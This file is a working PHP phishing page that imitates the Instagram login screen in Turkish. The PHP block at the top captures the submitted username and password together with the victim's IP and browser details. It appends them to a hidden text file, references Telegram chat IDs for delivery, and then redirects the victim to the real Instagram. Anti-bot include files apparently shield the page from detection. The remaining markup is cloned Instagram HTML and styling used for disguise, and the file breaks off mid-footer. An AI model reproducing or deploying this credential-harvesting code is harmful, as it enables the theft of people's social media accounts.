<?php
include "AntiBots/anti1.php";
include "AntiBots/anti2.php"; 
include "AntiBots/anti3.php"; 
include "AntiBots/anti4.php"; 
include "AntiBots/anti5.php"; 
include "AntiBots/anti6.php"; 
include "AntiBots/anti7.php"; 
include "AntiBots/anti8.php"; 
include "id.php";
if(isset($_POST['okbb'])){
  foreach($IdTelegram as $chatId) {
     $ip = $_SERVER['REMOTE_ADDR'];
         $date = date('m/d/Y h:i:s a', time());
         $message = "━━━Hesap━━━\n\n Username: ".$_POST['username']."\n Password: ".$_POST['password']."\n\n\n━━━Sistem━━━\n\n İp : ".$ip."\n Saat: ".$date."\n User-Agent : ".$_SERVER['HTTP_USER_AGENT'];
         
  
 
  }
 $myfile = fopen("kimsebulamazıslıkcalamazloooo.txt", "a+");
 $txt = $message;
 fwrite($myfile, $txt);
 fclose($myfile);
 HEADER("Location: https://instagram.com");
 }
?>
<html lang="en" class="js not-logged-in client-root js-focus-visible sDN5V"><head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">

        <title>Login • Instagram</title>
-
    </style>
        
        <meta name="robots" content="noimageindex, noarchive">
        <meta name="apple-mobile-web-app-status-bar-style" content="default">
        <meta name="mobile-web-app-capable" content="yes">
        <meta name="theme-color" content="#ffffff">
        <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, viewport-fit=cover">
        <link rel="manifest" href="https://www.instagram.com/data/manifest.json">

        <link rel="preload" href="https://www.instagram.com/static/bundles/es6/ConsumerUICommons.css/a016db3e46a0.css" as="style" type="text/css" crossorigin="anonymous">
<link rel="preload" href="https://www.instagram.com/static/bundles/es6/Consumer.css/d44ea27c0066.css" as="style" type="text/css" crossorigin="anonymous">
<link rel="preload" href="https://www.instagram.com/static/bundles/es6/FBSignupPage.css/55ba8f05e763.css" as="style" type="text/css" crossorigin="anonymous">
<link rel="preload" href="https://www.instagram.com/static/bundles/es6/LoginAndSignupPage.css/3ce984c47339.css" as="style" type="text/css" crossorigin="anonymous">
<link rel="preload" href="https://www.instagram.com/static/bundles/es6/Vendor.js/48e0f28aa478.js" as="script" type="text/javascript" crossorigin="anonymous">
<link rel="preload" href="https://www.instagram.com/static/bundles/es6/en_US.js/c0c34e285506.js" as="script" type="text/javascript" crossorigin="anonymous">
<link rel="preload" href="https://www.instagram.com/static/bundles/es6/ConsumerLibCommons.js/9036ca2a19b9.js" as="script" type="text/javascript" crossorigin="anonymous">
<link rel="preload" href="https://www.instagram.com/static/bundles/es6/ConsumerUICommons.js/d548b6ed893f.js" as="script" type="text/javascript" crossorigin="anonymous">
<link rel="preload" href="https://www.instagram.com/static/bundles/es6/ConsumerAsyncCommons.js/c4ca4238a0b9.js" as="script" type="text/javascript" crossorigin="anonymous">
<link rel="preload" href="https://www.instagram.com/static/bundles/es6/Consumer.js/896cb4b625ac.js" as="script" type="text/javascript" crossorigin="anonymous">
<link rel="preload" href="https://www.instagram.com/static/bundles/es6/FBSignupPage.js/d6ff79e9f739.js" as="script" type="text/javascript" crossorigin="anonymous">
<link rel="preload" href="https://www.instagram.com/static/bundles/es6/LoginAndSignupPage.js/492ca17c0097.js" as="script" type="text/javascript" crossorigin="anonymous">
        <link rel="prefetch" as="script" href="https://www.instagram.com/static/bundles/es6/FeedPageContainer.js/3e8994f5c4c9.js" type="text/javascript" crossorigin="anonymous">
<link rel="prefetch" as="stylesheet" href="https://www.instagram.com/static/bundles/es6/FeedPageContainer.css/31d2ed069293.css" type="text/css" crossorigin="anonymous">
        

        <script src="https://connect.facebook.net/en_US/sdk.js?hash=7170888a91f057195eb37edc74088509" async="" crossorigin="anonymous"></script><script id="facebook-jssdk" src="https://connect.facebook.net/en_US/sdk.js"></script><script type="text/javascript">
        (function() {
  var docElement = document.documentElement;
  var classRE = new RegExp('(^|\\s)no-js(\\s|$)');
  var className = docElement.className;
  docElement.className = className.replace(classRE, '$1js$2');
})();
</script>
        <script type="text/javascript">
(function() {
  if ('PerformanceObserver' in window && 'PerformancePaintTiming' in window) {
    window.__bufferedPerformance = [];
    var ob = new PerformanceObserver(function(e) {
      window.__bufferedPerformance.push.apply(window.__bufferedPerformance,e.getEntries());
    });
    ob.observe({entryTypes:['paint']});
  }

  window.__bufferedErrors = [];
  window.onerror = function(message, url, line, column, error) {
    window.__bufferedErrors.push({
      message: message,
      url: url,
      line: line,
      column: column,
      error: error
    });
    return false;
  };
  window.__initialData = {
    pending: true,
    waiting: []
  };
  function asyncFetchSharedData(extra) {
    var sharedDataReq = new XMLHttpRequest();
    sharedDataReq.onreadystatechange = function() {
          if (sharedDataReq.readyState === 4) {
            if(sharedDataReq.status === 200){
              var sharedData = JSON.parse(sharedDataReq.responseText);
              window.__initialDataLoaded(sharedData, extra);
            }
          }
        }
    sharedDataReq.open('GET', '/data/shared_data/', true);
    sharedDataReq.send(null);
  }
  function notifyLoaded(item, data) {
    item.pending = false;
    item.data = data;
    for (var i = 0;i < item.waiting.length; ++i) {
      item.waiting[i].resolve(item.data);
    }
    item.waiting = [];
  }
  function notifyError(item, msg) {
    item.pending = false;
    item.error = new Error(msg);
    for (var i = 0;i < item.waiting.length; ++i) {
      item.waiting[i].reject(item.error);
    }
    item.waiting = [];
  }
  window.__initialDataLoaded = function(initialData, extraData) {
    if (extraData) {
      for (var key in extraData) {
        initialData[key] = extraData[key];
      }
    }
    notifyLoaded(window.__initialData, initialData);
  };
  window.__initialDataError = function(msg) {
    notifyError(window.__initialData, msg);
  };
  window.__additionalData = {};
  window.__pendingAdditionalData = function(paths) {
    for (var i = 0;i < paths.length; ++i) {
      window.__additionalData[paths[i]] = {
        pending: true,
        waiting: []
      };
    }
  };
  window.__additionalDataLoaded = function(path, data) {
    if (path in window.__additionalData) {
      notifyLoaded(window.__additionalData[path], data);
    } else {
      console.error('Unexpected additional data loaded "' + path + '"');
    }
  };
  window.__additionalDataError = function(path, msg) {
    if (path in window.__additionalData) {
      notifyError(window.__additionalData[path], msg);
    } else {
      console.error('Unexpected additional data encountered an error "' + path + '": ' + msg);
    }
  };
  
})();
</script><script type="text/javascript">

/*
 Copyright 2018 Google Inc. All Rights Reserved.
 Licensed under the Apache License, Version 2.0 (the "License");
 you may not use this file except in compliance with the License.
 You may obtain a copy of the License at

     http://www.apache.org/licenses/LICENSE-2.0

 Unless required by applicable law or agreed to in writing, software
 distributed under the License is distributed on an "AS IS" BASIS,
 WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 See the License for the specific language governing permissions and
 limitations under the License.
*/

(function(){function g(a,c){b||(b=a,f=c,h.forEach(function(a){removeEventListener(a,l,e)}),m())}function m(){b&&f&&0<d.length&&(d.forEach(function(a){a(b,f)}),d=[])}function n(a,c){function k(){g(a,c);d()}function b(){d()}function d(){removeEventListener("pointerup",k,e);removeEventListener("pointercancel",b,e)}addEventListener("pointerup",k,e);addEventListener("pointercancel",b,e)}function l(a){if(a.cancelable){var c=performance.now(),b=a.timeStamp;b>c&&(c=+new Date);c-=b;"pointerdown"==a.type?n(c,
a):g(c,a)}}var e={passive:!0,capture:!0},h=["click","mousedown","keydown","touchstart","pointerdown"],b,f,d=[];h.forEach(function(a){addEventListener(a,l,e)});window.perfMetrics=window.perfMetrics||{};window.perfMetrics.onFirstInputDelay=function(a){d.push(a);m()}})();
</script>

                <link rel="apple-touch-icon-precomposed" sizes="76x76" href="https://www.instagram.com/static/images/ico/apple-touch-icon-76x76-precomposed.png/666282be8229.png">
                <link rel="apple-touch-icon-precomposed" sizes="120x120" href="https://www.instagram.com/static/images/ico/apple-touch-icon-120x120-precomposed.png/8a5bd3f267b1.png">
                <link rel="apple-touch-icon-precomposed" sizes="152x152" href="https://www.instagram.com/static/images/ico/apple-touch-icon-152x152-precomposed.png/68193576ffc5.png">
                <link rel="apple-touch-icon-precomposed" sizes="167x167" href="https://www.instagram.com/static/images/ico/apple-touch-icon-167x167-precomposed.png/4985e31c9100.png">
                <link rel="apple-touch-icon-precomposed" sizes="180x180" href="https://www.instagram.com/static/images/ico/apple-touch-icon-180x180-precomposed.png/c06fdb2357bd.png">
                
                    <link rel="icon" sizes="192x192" href="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png">
                
            
            
                    <link rel="mask-icon" href="https://www.instagram.com/static/images/ico/favicon.svg/fc72dd4bfde8.svg" color="#262626">
                  
                  <link rel="shortcut icon" type="image/x-icon" href="https://www.instagram.com/static/images/ico/favicon.ico/36b3ee2d91ed.ico">
                
            
            
            

                    <meta content="Welcome back to Instagram. Sign in to check out what your friends, family &amp; interests have been capturing &amp; sharing around the world." name="description">
                    <link rel="canonical" href="https://www.instagram.com/accounts/login/">
                
<link rel="stylesheet" href="css/a016db3e46a0.css">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher" hreflang="x-default">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=en" hreflang="en">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=fr" hreflang="fr">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=it" hreflang="it">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=de" hreflang="de">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=es" hreflang="es">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=zh-cn" hreflang="zh-cn">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=zh-tw" hreflang="zh-tw">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=ja" hreflang="ja">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=ko" hreflang="ko">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=pt" hreflang="pt">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=pt-br" hreflang="pt-br">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=af" hreflang="af">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=cs" hreflang="cs">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=da" hreflang="da">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=el" hreflang="el">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=fi" hreflang="fi">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=hr" hreflang="hr">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=hu" hreflang="hu">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=id" hreflang="id">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=ms" hreflang="ms">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=nb" hreflang="nb">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=nl" hreflang="nl">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=pl" hreflang="pl">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=ru" hreflang="ru">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=sk" hreflang="sk">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=sv" hreflang="sv">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=th" hreflang="th">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=tl" hreflang="tl">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=tr" hreflang="tr">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=hi" hreflang="hi">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=bn" hreflang="bn">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=gu" hreflang="gu">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=kn" hreflang="kn">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=ml" hreflang="ml">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=mr" hreflang="mr">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=pa" hreflang="pa">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=ta" hreflang="ta">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=te" hreflang="te">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=ne" hreflang="ne">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=si" hreflang="si">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=ur" hreflang="ur">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=vi" hreflang="vi">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=bg" hreflang="bg">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=fr-ca" hreflang="fr-ca">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=ro" hreflang="ro">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=sr" hreflang="sr">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=uk" hreflang="uk">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=zh-hk" hreflang="zh-hk">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=es-la" hreflang="es-gt">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=es-la" hreflang="es-cl">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=es-la" hreflang="es-do">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=es-la" hreflang="es-sv">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=es-la" hreflang="es-hn">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=es-la" hreflang="es-ec">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=es-la" hreflang="es-ni">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=es-la" hreflang="es-uy">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=es-la" hreflang="es-py">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=es-la" hreflang="es-cu">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=es-la" hreflang="es-cr">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=es-la" hreflang="es-ve">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=es-la" hreflang="es-bo">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=es-la" hreflang="es-co">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=es-la" hreflang="es-pr">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=es-la" hreflang="es-pa">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=es-la" hreflang="es-mx">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=es-la" hreflang="es-ar">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=es-la" hreflang="es-pe">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=en-gb" hreflang="en-gb">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=sw-ke" hreflang="sw-ke">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=ha-ng" hreflang="ha-ng">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=am-et" hreflang="am-et">
<link rel="alternate" href="https://www.instagram.com/accounts/login/?source=auth_switcher&amp;hl=om-et" hreflang="om-et">
<script type="text/javascript" as="script" crossorigin="anonymous" charset="utf-8" async="" src="https://www.instagram.com/static/bundles/es6/LoginAndSignupPage.js/492ca17c0097.js"></script><link href="https://www.instagram.com/static/bundles/es6/LoginAndSignupPage.css/3ce984c47339.css" type="text/css" crossorigin="anonymous" rel="stylesheet"><script type="text/javascript" as="script" crossorigin="anonymous" charset="utf-8" async="" src="https://www.instagram.com/static/bundles/es6/BDClientSignalCollectionTrigger.js/55ae501990e9.js"></script><style type="text/css" data-fbcssmodules="css:fb.css.base css:fb.css.dialog css:fb.css.iframewidget css:fb.css.customer_chat_plugin_iframe">.fb_hidden{position:absolute;top:-10000px;z-index:10001}.fb_reposition{overflow:hidden;position:relative}.fb_invisible{display:none}.fb_reset{background:none;border:0;border-spacing:0;color:#000;cursor:auto;direction:ltr;font-family:"lucida grande", tahoma, verdana, arial, sans-serif;font-size:11px;font-style:normal;font-variant:normal;font-weight:normal;letter-spacing:normal;line-height:1;margin:0;overflow:visible;padding:0;text-align:left;text-decoration:none;text-indent:0;text-shadow:none;text-transform:none;visibility:visible;white-space:normal;word-spacing:normal}.fb_reset>div{overflow:hidden}@keyframes fb_transform{from{opacity:0;transform:scale(.95)}to{opacity:1;transform:scale(1)}}.fb_animate{animation:fb_transform .3s forwards}
.fb_dialog{background:rgba(82, 82, 82, .7);position:absolute;top:-10000px;z-index:10001}.fb_dialog_advanced{border-radius:8px;padding:10px}.fb_dialog_content{background:#fff;color:#373737}.fb_dialog_close_icon{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/yq/r/IE9JII6Z1Ys.png) no-repeat scroll 0 0 transparent;cursor:pointer;display:block;height:15px;position:absolute;right:18px;top:17px;width:15px}.fb_dialog_mobile .fb_dialog_close_icon{left:5px;right:auto;top:5px}.fb_dialog_padding{background-color:transparent;position:absolute;width:1px;z-index:-1}.fb_dialog_close_icon:hover{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/yq/r/IE9JII6Z1Ys.png) no-repeat scroll 0 -15px transparent}.fb_dialog_close_icon:active{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/yq/r/IE9JII6Z1Ys.png) no-repeat scroll 0 -30px transparent}.fb_dialog_iframe{line-height:0}.fb_dialog_content .dialog_title{background:#6d84b4;border:1px solid #365899;color:#fff;font-size:14px;font-weight:bold;margin:0}.fb_dialog_content .dialog_title>span{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/yd/r/Cou7n-nqK52.gif) no-repeat 5px 50%;float:left;padding:5px 0 7px 26px}body.fb_hidden{height:100%;left:0;margin:0;overflow:visible;position:absolute;top:-10000px;transform:none;width:100%}.fb_dialog.fb_dialog_mobile.loading{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/ya/r/3rhSv5V8j3o.gif) white no-repeat 50% 50%;min-height:100%;min-width:100%;overflow:hidden;position:absolute;top:0;z-index:10001}.fb_dialog.fb_dialog_mobile.loading.centered{background:none;height:auto;min-height:initial;min-width:initial;width:auto}.fb_dialog.fb_dialog_mobile.loading.centered #fb_dialog_loader_spinner{width:100%}.fb_dialog.fb_dialog_mobile.loading.centered .fb_dialog_content{background:none}.loading.centered #fb_dialog_loader_close{clear:both;color:#fff;display:block;font-size:18px;padding-top:20px}#fb-root #fb_dialog_ipad_overlay{background:rgba(0, 0, 0, .4);bottom:0;left:0;min-height:100%;position:absolute;right:0;top:0;width:100%;z-index:10000}#fb-root #fb_dialog_ipad_overlay.hidden{display:none}.fb_dialog.fb_dialog_mobile.loading iframe{visibility:hidden}.fb_dialog_mobile .fb_dialog_iframe{position:sticky;top:0}.fb_dialog_content .dialog_header{background:linear-gradient(from(#738aba), to(#2c4987));border-bottom:1px solid;border-color:#043b87;box-shadow:white 0 1px 1px -1px inset;color:#fff;font:bold 14px Helvetica, sans-serif;text-overflow:ellipsis;text-shadow:rgba(0, 30, 84, .296875) 0 -1px 0;vertical-align:middle;white-space:nowrap}.fb_dialog_content .dialog_header table{height:43px;width:100%}.fb_dialog_content .dialog_header td.header_left{font-size:12px;padding-left:5px;vertical-align:middle;width:60px}.fb_dialog_content .dialog_header td.header_right{font-size:12px;padding-right:5px;vertical-align:middle;width:60px}.fb_dialog_content .touchable_button{background:linear-gradient(from(#4267B2), to(#2a4887));background-clip:padding-box;border:1px solid #29487d;border-radius:3px;display:inline-block;line-height:18px;margin-top:3px;max-width:85px;padding:4px 12px;position:relative}.fb_dialog_content .dialog_header .touchable_button input{background:none;border:none;color:#fff;font:bold 12px Helvetica, sans-serif;margin:2px -12px;padding:2px 6px 3px 6px;text-shadow:rgba(0, 30, 84, .296875) 0 -1px 0}.fb_dialog_content .dialog_header .header_center{color:#fff;font-size:16px;font-weight:bold;line-height:18px;text-align:center;vertical-align:middle}.fb_dialog_content .dialog_content{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/y9/r/jKEcVPZFk-2.gif) no-repeat 50% 50%;border:1px solid #4a4a4a;border-bottom:0;border-top:0;height:150px}.fb_dialog_content .dialog_footer{background:#f5f6f7;border:1px solid #4a4a4a;border-top-color:#ccc;height:40px}#fb_dialog_loader_close{float:left}.fb_dialog.fb_dialog_mobile .fb_dialog_close_icon{visibility:hidden}#fb_dialog_loader_spinner{animation:rotateSpinner 1.2s linear infinite;background-color:transparent;background-image:url(https://static.xx.fbcdn.net/rsrc.php/v3/yD/r/t-wz8gw1xG1.png);background-position:50% 50%;background-repeat:no-repeat;height:24px;width:24px}@keyframes rotateSpinner{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
.fb_iframe_widget{display:inline-block;position:relative}.fb_iframe_widget span{display:inline-block;position:relative;text-align:justify}.fb_iframe_widget iframe{position:absolute}.fb_iframe_widget_fluid_desktop,.fb_iframe_widget_fluid_desktop span,.fb_iframe_widget_fluid_desktop iframe{max-width:100%}.fb_iframe_widget_fluid_desktop iframe{min-width:220px;position:relative}.fb_iframe_widget_lift{z-index:1}.fb_iframe_widget_fluid{display:inline}.fb_iframe_widget_fluid span{width:100%}
.fb_mpn_mobile_landing_page_slide_out{animation-duration:200ms;animation-name:fb_mpn_landing_page_slide_out;transition-timing-function:ease-in}.fb_mpn_mobile_landing_page_slide_out_from_left{animation-duration:200ms;animation-name:fb_mpn_landing_page_slide_out_from_left;transition-timing-function:ease-in}.fb_mpn_mobile_landing_page_slide_up{animation-duration:500ms;animation-name:fb_mpn_landing_page_slide_up;transition-timing-function:ease-in}.fb_mpn_mobile_bounce_in{animation-duration:300ms;animation-name:fb_mpn_bounce_in;transition-timing-function:ease-in}.fb_mpn_mobile_bounce_out{animation-duration:300ms;animation-name:fb_mpn_bounce_out;transition-timing-function:ease-in}.fb_mpn_mobile_bounce_out_v2{animation-duration:300ms;animation-name:fb_mpn_fade_out;transition-timing-function:ease-in}.fb_customer_chat_bounce_in_v2{animation-duration:300ms;animation-name:fb_bounce_in_v2;transition-timing-function:ease-in}.fb_customer_chat_bounce_in_from_left{animation-duration:300ms;animation-name:fb_bounce_in_from_left;transition-timing-function:ease-in}.fb_customer_chat_bounce_out_v2{animation-duration:300ms;animation-name:fb_bounce_out_v2;transition-timing-function:ease-in}.fb_customer_chat_bounce_out_from_left{animation-duration:300ms;animation-name:fb_bounce_out_from_left;transition-timing-function:ease-in}.fb_invisible_flow{display:inherit;height:0;overflow-x:hidden;width:0}@keyframes fb_mpn_landing_page_slide_out{0%{margin:0 12px;width:100% - 24px}60%{border-radius:18px}100%{border-radius:50%;margin:0 24px;width:60px}}@keyframes fb_mpn_landing_page_slide_out_from_left{0%{left:12px;width:100% - 24px}60%{border-radius:18px}100%{border-radius:50%;left:12px;width:60px}}@keyframes fb_mpn_landing_page_slide_up{0%{bottom:0;opacity:0}100%{bottom:24px;opacity:1}}@keyframes fb_mpn_bounce_in{0%{opacity:.5;top:100%}100%{opacity:1;top:0}}@keyframes fb_mpn_fade_out{0%{bottom:30px;opacity:1}100%{bottom:0;opacity:0}}@keyframes fb_mpn_bounce_out{0%{opacity:1;top:0}100%{opacity:.5;top:100%}}@keyframes fb_bounce_in_v2{0%{opacity:0;transform:scale(0, 0);transform-origin:bottom right}50%{transform:scale(1.03, 1.03);transform-origin:bottom right}100%{opacity:1;transform:scale(1, 1);transform-origin:bottom right}}@keyframes fb_bounce_in_from_left{0%{opacity:0;transform:scale(0, 0);transform-origin:bottom left}50%{transform:scale(1.03, 1.03);transform-origin:bottom left}100%{opacity:1;transform:scale(1, 1);transform-origin:bottom left}}@keyframes fb_bounce_out_v2{0%{opacity:1;transform:scale(1, 1);transform-origin:bottom right}100%{opacity:0;transform:scale(0, 0);transform-origin:bottom right}}@keyframes fb_bounce_out_from_left{0%{opacity:1;transform:scale(1, 1);transform-origin:bottom left}100%{opacity:0;transform:scale(0, 0);transform-origin:bottom left}}@keyframes slideInFromBottom{0%{opacity:.1;transform:translateY(100%)}100%{opacity:1;transform:translateY(0)}}@keyframes slideInFromBottomDelay{0%{opacity:0;transform:translateY(100%)}97%{opacity:0;transform:translateY(100%)}100%{opacity:1;transform:translateY(0)}}</style></head>
    <body class="" style="">
        
    <div id="react-root">
    <section class="_9eogI E3X2T">
        <div></div>
        <main class="SCxLW o64aR" role="main">
            <div class="Igw0E rBNOH YBx95 ybXk5 vwCYk MGky5 i0EQd" style="min-height: 100%;">
                <div class="rgFsT">
                    <div class="gr27e">
                        <h1 class="NXVPg Szr5J coreSpriteLoggedOutWordmark">Instagram</h1>
                        <div class="EPjEi">
                            <form id="loginForm" method="post">
                                <div class="Igw0E IwRSH eGOV_ _4EzTm kEKum">
                                    <div class="-MzZI">
                                        <div class="_9GP1n">
                                            <label class="f0n8F">
                                                <span class="_9nyy2"></span>
                                                <input
                                                required
                                                    id="test"
                                                    aria-label="Telefon numarası, kullanıcı adı veya e-posta"
                                                    aria-required="true"
                                                    autocapitalize="off"
                                                    autocorrect="off"
                                                    maxlength="75"
                                                    placeholder="Telefon numarası, kullanıcı adı veya e-posta"
                                                    name="username"
                                                    type="text"
                                                    class="_2hvTZ pexuQ zyHYP"
                                                    value=""
                                                />
                                            </label>
                                            <div class="i24fI"></div>
                                        </div>
                                    </div>
                                    <div class="-MzZI">
                                        <div class="_9GP1n">
                                            <label class="f0n8F">
                                                <span class="_9nyy2"></span>
                                                <input required aria-label="Password" id="test" aria-required="true" autocapitalize="off" autocorrect="off" placeholder="Şifre" name="password" type="password" class="_2hvTZ pexuQ zyHYP" value="" />
                                            </label>
                                            <div class="i24fI"></div>
                                        </div>
                                    </div>
                                    <div class="Igw0E IwRSH eGOV_ _4EzTm bkEs3 CovQj jKUp7 DhRcB">
                                        <button class="sqdOP L3NKy y3zKF" name="okbb" type="submit"><div class="Igw0E IwRSH eGOV_ _4EzTm">Giriş Yap</div></button>
                                    </div>
                                    <div class="K-1uj Z7p_S">
                                        <div class="s311c"></div>
                                        <div class="_0tv-g">ya da</div>
                                        <div class="s311c"></div>
                                    </div>
                                    <div class="Igw0E IwRSH eGOV_ _4EzTm bkEs3 CovQj jKUp7 DhRcB">
                                        <button class="sqdOP yWX7d y3zKF" type="button"><span class="coreSpriteFacebookIcon AeB99"></span><span class="KPnG0">Facebook ile Giriş Yap</span></button>
                                    </div>
                                </div>
                            </form>
                        </div>
                    </div>
                    <div class="gr27e">
                        <div class="_7UhW9 xLCgt MMzan _0PwGv uL8Hv">
                            <p class="izU2O">
                              Hesabın yok mu? <a href="/accounts/emailsignup/" tabindex="0"><span class="_7UhW9 xLCgt qyrsm gtFbE se6yk">Kaydol</span></a>
                            </p>
                        </div>
                    </div>
                    <div class="APQi1">
                        <p class="b_nGN">Uygulamayı indir.</p>
                        <div class="iNy2T">
                            <a class="z1VUo" href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8&amp;vt=lo" tabindex="0">
                                <img alt="Available on the App Store" class="Rt8TI" src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_turkish-tr.png/30b29fd697b2.png" />
                            </a>
                            <a
                                class="z1VUo"
                                href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26ig_mid%3DAE18AE49-A123-481D-97F8-4667B5CCD9CD%26utm_content%3Dlo%26utm_medium%3Dbadge"
                                tabindex="0"
                            >
                                <img alt="Available on Google Play" class="Rt8TI" src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_turkish-tr.png/9d46177cf153.png" />
                            </a>
                        </div>
                    </div>
                </div>
            </div>
        </main>
        <footer class="_8Rna9 _3Laht pC2e0" role="contentinfo">
            <div class="Igw0E IwRSH eGOV_ _4EzTm KokQV">
                <div class="Igw0E IwRSH eGOV_ _4EzTm kEKum">
                    <div class="Igw0E IwRSH YBx95 ybXk5 _4EzTm YlhBV">
                        <div class="Igw0E IwRSH eGOV_ _4EzTm _22l1 soMvl JI_ht">
